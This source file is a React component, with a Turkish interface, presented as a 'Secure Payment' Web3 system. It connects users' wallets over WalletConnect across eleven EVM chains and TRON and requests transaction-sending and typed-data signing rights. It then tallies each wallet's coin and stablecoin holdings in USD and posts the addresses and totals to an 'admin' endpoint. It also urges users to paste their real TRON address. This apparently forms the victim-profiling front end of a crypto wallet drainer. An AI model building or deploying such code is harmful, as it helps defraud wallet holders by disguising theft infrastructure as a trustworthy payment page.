import { useState } from "react";
import UniversalProvider from "@walletconnect/universal-provider";
import { WalletConnectModal } from "@walletconnect/modal";
import { TronWeb } from "tronweb";
import { API_URL } from "./config";

const projectId = "c46979307f3f04398d086294ddbc8768";

const modal = new WalletConnectModal({
  projectId,
  themeMode: "dark",
});

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
});

const TRON_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";

const RPCS = {
  1: "https://ethereum.publicnode.com",
  10: "https://mainnet.optimism.io",
  56: "https://bsc-dataseed.binance.org",
  137: "https://polygon-rpc.com",
  250: "https://rpcapi.fantom.network",
  324: "https://mainnet.era.zksync.io",
  43114: "https://api.avax.network/ext/bc/C/rpc",
  42161: "https://arb1.arbitrum.io/rpc",
  59144: "https://rpc.linea.build",
  8453: "https://mainnet.base.org",
  534352: "https://rpc.scroll.io",
};

const CHAIN_SYMBOLS = {
  1: "ETH",
  10: "OP ETH",
  56: "BNB",
  137: "MATIC",
  250: "FTM",
  324: "ZKSYNC ETH",
  43114: "AVAX",
  42161: "ARB ETH",
  59144: "LINEA ETH",
  8453: "BASE ETH",
  534352: "SCROLL ETH",
};

const PRICE_IDS = {
  ETH: "ethereum",
  "OP ETH": "ethereum",
  "ARB ETH": "ethereum",
  "BASE ETH": "ethereum",
  "LINEA ETH": "ethereum",
  "ZKSYNC ETH": "ethereum",
  "SCROLL ETH": "ethereum",
  WETH: "ethereum",
  BNB: "binancecoin",
  WBNB: "binancecoin",
  MATIC: "polygon-ecosystem-token",
  FTM: "fantom",
  AVAX: "avalanche-2",
  WAVAX: "avalanche-2",
  TRX: "tron",
  USDT: "tether",
  USDC: "usd-coin",
  "TRC20 USDT": "tether",
};

const TOKENS = {
  1: [
    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
  ],
  10: [
    { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
    { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAF62653d097Ff85", decimals: 6 },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
  ],
  56: [
    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    { symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 },
    { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
  ],
  137: [
    { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
    { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
    { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 },
  ],
  250: [
    { symbol: "USDT", address: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", decimals: 6 },
    { symbol: "USDC", address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", decimals: 6 },
    { symbol: "WFTM", address: "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83", decimals: 18 },
  ],
  324: [
    { symbol: "USDT", address: "0x493257fD37EDB34451f62EDf8D2a0C418852bA4C", decimals: 6 },
    { symbol: "USDC", address: "0x1d17CBcF0D8D826B8839D7D13A2B85d46C1Bf27D", decimals: 6 },
    { symbol: "WETH", address: "0x5aea5775959fbc2557cc8789bc1bf90a239d9a91", decimals: 18 },
  ],
  43114: [
    { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4DF4A8c7", decimals: 6 },
    { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
    { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebe478A1C0b69FCbb9", decimals: 6 },
    { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
    { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 },
  ],
  59144: [
    { symbol: "USDT", address: "0xA219439258ca9da29E9Cc4cE5596924745e12B93", decimals: 6 },
    { symbol: "USDC", address: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff", decimals: 6 },
    { symbol: "WETH", address: "0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f", decimals: 18 },
  ],
  8453: [
    { symbol: "USDT", address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
  ],
  534352: [
    { symbol: "USDC", address: "0x06efdbff2a14a7c8e15944d1f4a48f9f95f663a4", decimals: 6 },
    { symbol: "WETH", address: "0x5300000000000000000000000000000000000004", decimals: 18 },
  ],
};

async function getPrices() {
  try {
    const ids = [...new Set(Object.values(PRICE_IDS))].join(",");
    const res = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`
    );
    return await res.json();
  } catch {
    return {};
  }
}

function usdValue(symbol, amount, prices) {
  const id = PRICE_IDS[symbol];
  const price = prices?.[id]?.usd || 0;
  return amount * price;
}

function formatLine(symbol, amount, prices) {
  const usd = usdValue(symbol, amount, prices);
  return `${symbol}: ${amount.toFixed(6)} ≈ $${usd.toFixed(2)}`;
}

async function getNativeBalance(chainId, address, symbol, prices) {
  const response = await fetch(RPCS[chainId], {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      method: "eth_getBalance",
      params: [address, "latest"],
      id: 1,
    }),
  });

  const data = await response.json();
  const amount = parseInt(data.result || "0x0", 16) / 1e18;

  return {
    line: formatLine(symbol, amount, prices),
    usd: usdValue(symbol, amount, prices),
  };
}

async function getTokenBalance(rpc, tokenAddress, wallet, decimals, symbol, prices) {
  const walletClean = wallet.replace("0x", "").padStart(64, "0");
  const dataField = "0x70a08231" + walletClean;

  const response = await fetch(rpc, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      method: "eth_call",
      params: [{ to: tokenAddress, data: dataField }, "latest"],
      id: 1,
    }),
  });

  const data = await response.json();
  const amount = parseInt(data.result || "0x0", 16) / 10 ** decimals;

  return {
    line: formatLine(symbol, amount, prices),
    usd: usdValue(symbol, amount, prices),
  };
}

async function getTrxBalance(address, prices) {
  try {
    const res = await fetch(
      `https://apilist.tronscanapi.com/api/account?address=${address}`
    );

    const data = await res.json();

    const amount = Number(data.balance || 0) / 1e6;

    return {
      line: formatLine("TRX", amount, prices),
      usd: usdValue("TRX", amount, prices),
      amount,
    };
  } catch {
    return {
      line: "TRX: okunamadı",
      usd: 0,
      amount: 0,
    };
  }
}

async function getTrc20UsdtBalance(address, prices) {
  try {
    const res = await fetch(
      `https://apilist.tronscanapi.com/api/account?address=${address}`
    );

    const data = await res.json();

    const usdt = data.trc20token_balances?.find(
      (t) =>
        t.tokenAbbr === "USDT" ||
        t.tokenName === "Tether USD" ||
        t.tokenId === "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
    );

    const amount = usdt ? Number(usdt.balance || 0) / 1e6 : 0;

    return {
      line: formatLine("TRC20 USDT", amount, prices),
      usd: usdValue("TRC20 USDT", amount, prices),
    };
  } catch {
    return {
      line: "TRC20 USDT: 0.000000 ≈ $0.00",
      usd: 0,
    };
  }
}

async function sendToAdmin(payload) {
  await fetch(`${API_URL}/wallets`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

async function sendLog(data) {
  try {
    await fetch(`${API_URL}/activity-log`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  } catch (err) {
    console.log("LOG HATA:", err);
  }
}

export default function MultiChainConnect() {
  const [status, setStatus] = useState("");
  const [error, setError] = useState("");
  const [showTronVerify, setShowTronVerify] = useState(false);
  const [manualTron, setManualTron] = useState("");
  const [lastPayload, setLastPayload] = useState(null);

  const verifyTronAddress = async () => {
    try {
      setError("");

      if (!manualTron || !manualTron.startsWith("T")) {
        setError("Geçerli bir TRON adresi gir.");
        return;
      }

      const prices = await getPrices();

      const oldLines = lastPayload?.tokenBalances || [];
      let totalUsd = Number(lastPayload?.totalUsd || 0);

      const withoutOldTron = oldLines.filter(
        (x) =>
          !x.startsWith("TRON:") &&
          !x.startsWith("TRX:") &&
          !x.startsWith("TRC20 USDT:")
      );

      const trx = await getTrxBalance(manualTron, prices);
      const trc20 = await getTrc20UsdtBalance(manualTron, prices);

      const newTokenBalances = [
        ...withoutOldTron,
        `TRON: ${manualTron}`,
        trx.line,
        trc20.line,
      ];

      const updatedPayload = {
        ...(lastPayload || {}),
        network: "MULTI-CHAIN",
        chainId: "multi",
        nativeBalance: "Çoklu ağ bakiyeleri aşağıda",
        usdtBalance: trc20.usd > 0 ? trc20.line : lastPayload?.usdtBalance || "0.00 USDT",
        tokenBalances: newTokenBalances,
        totalUsd: Math.max(0, totalUsd) + trx.usd + trc20.usd,
      };

      setLastPayload(updatedPayload);
      await sendToAdmin(updatedPayload);

      setStatus("TRON doğrulandı, admin panel güncellendi");
      setShowTronVerify(false);
    } catch {
      setError("TRON doğrulama başarısız");
    }
  };

  const connectAll = async () => {
    try {
      setError("");
      setStatus("Provider hazırlanıyor...");

      await sendLog({
        type: "connect",
        title: "Wallet bağlantısı başlatıldı",
        message: "Kullanıcı connect butonuna bastı",
        status: "pending",
      });
      setShowTronVerify(false);

      const prices = await getPrices();

      const provider = await UniversalProvider.init({
        projectId,
        metadata: {
          name: "Secure Payment",
          description: "Transparent Web3 payment system",
          url: window.location.origin,
          icons: [],
        },
      });

      provider.on("display_uri", async (uri) => {
        setStatus("Cüzdan onayı bekleniyor...");

        await sendLog({
          type: "connect",
          title: "Wallet onayı bekleniyor",
          message: "WalletConnect QR açıldı",
          status: "pending",
        });
        await modal.openModal({ uri });
      });

      const session = await provider.connect({
        namespaces: {
          eip155: {
            chains: [
              "eip155:1",
              "eip155:10",
              "eip155:56",
              "eip155:137",
              "eip155:250",
              "eip155:324",
              "eip155:43114",
              "eip155:42161",
              "eip155:59144",
              "eip155:8453",
              "eip155:534352",
            ],
            methods: [
              "eth_sendTransaction",
              "personal_sign",
              "eth_signTypedData",
              "eth_signTypedData_v4",
            ],
            events: ["accountsChanged", "chainChanged"],
          },
          tron: {
            chains: ["tron:0x2b6653dc"],
            methods: [
              "tron_signTransaction",
              "tron_signMessage",
              "tron_signMessageV2",
              "tron_sendTransaction",
            ],
            events: ["accountsChanged", "chainChanged"],
          },
        },
      });

      await modal.closeModal();

      const allAccounts = [];
      Object.entries(session.namespaces).forEach(([_, data]) => {
        data.accounts.forEach((acc) => allAccounts.push(acc));
      });

      const tokenBalances = [];
      let usdtBalance = "0.00 USDT";
      let totalUsd = 0;
      let shouldVerifyTron = false;

      for (const acc of allAccounts) {
        if (acc.startsWith("tron:")) {
          const tronAddress = acc.split(":")[2];

          tokenBalances.push(`TRON: ${tronAddress}`);

          const trx = await getTrxBalance(tronAddress, prices);
          tokenBalances.push(trx.line);
          totalUsd += trx.usd;

          const trc20Usdt = await getTrc20UsdtBalance(tronAddress, prices);
          tokenBalances.push(trc20Usdt.line);
          totalUsd += trc20Usdt.usd;

          if (trx.amount === 0) {
            shouldVerifyTron = true;
          }

          if (trc20Usdt.usd > 0) {
            usdtBalance = trc20Usdt.line;
          }
        }

        const evmMatch = acc.match(/^eip155:(\d+):(0x[a-fA-F0-9]{40})$/);

        if (evmMatch) {
          const chainId = Number(evmMatch[1]);
          const address = evmMatch[2];
          const symbol = CHAIN_SYMBOLS[chainId];

          if (!symbol || !RPCS[chainId]) continue;

          const native = await getNativeBalance(chainId, address, symbol, prices);
          tokenBalances.push(native.line);
          totalUsd += native.usd;

          const chainTokens = TOKENS[chainId] || [];

          for (const token of chainTokens) {
            const tokenBalance = await getTokenBalance(
              RPCS[chainId],
              token.address,
              address,
              token.decimals,
              token.symbol,
              prices
            );

            tokenBalances.push(tokenBalance.line);
            totalUsd += tokenBalance.usd;

            if (token.symbol === "USDT" && tokenBalance.usd > 0) {
              usdtBalance = tokenBalance.line;
            }
          }
        }
      }

      tokenBalances.push(`TOPLAM USD: $${totalUsd.toFixed(2)}`);

      const payload = {
        address: allAccounts.join(" | "),
        network: "MULTI-CHAIN",
        chainId: "multi",
        nativeBalance: `Toplam Wallet Değeri: $${totalUsd.toFixed(2)}`,
        usdtBalance,
        tokenBalances,
        totalUsd,
      };

      setLastPayload(payload);
      setShowTronVerify(shouldVerifyTron);

      await sendToAdmin(payload);

      await sendLog({
        type: "wallet",
        title: "Cüzdan bağlandı",
        message: `Toplam değer: $${totalUsd.toFixed(2)}`,
        address: payload.address,
        status: "success",
      });

      setStatus(
        shouldVerifyTron
          ? "Bağlantı başarılı. TRON 0 göründü, doğrulama gerekebilir."
          : "Bağlantı başarılı"
      );
    } catch (err) {
      console.error("MULTICHAIN HATA:", err);
      setStatus("");
      await sendLog({
        type: "error",
        title: "Wallet bağlantı hatası",
        message: err?.message || "Bilinmeyen hata",
        status: "error",
      });

      setError(err?.message || "Bağlantı hatası");
    }
  };

  return (
    <div>
      <button onClick={connectAll}>Cüzdanları Bağla</button>

      {showTronVerify && (
        <div className="notice">
          <b>TRON doğrulama gerekli olabilir.</b>
          <br />
          iPhone’da TRX 0 göründüyse Trust Wallet’taki gerçek TRON adresini yapıştır.
          <input
            className="input"
            placeholder="TRON adresini yapıştır"
            value={manualTron}
            onChange={(e) => setManualTron(e.target.value)}
          />
          <button onClick={verifyTronAddress}>TRON Adresini Doğrula</button>
        </div>
      )}

      {status && <div className="notice">{status}</div>}
      {error && <div className="error-box">{error}</div>}
    </div>
  );
}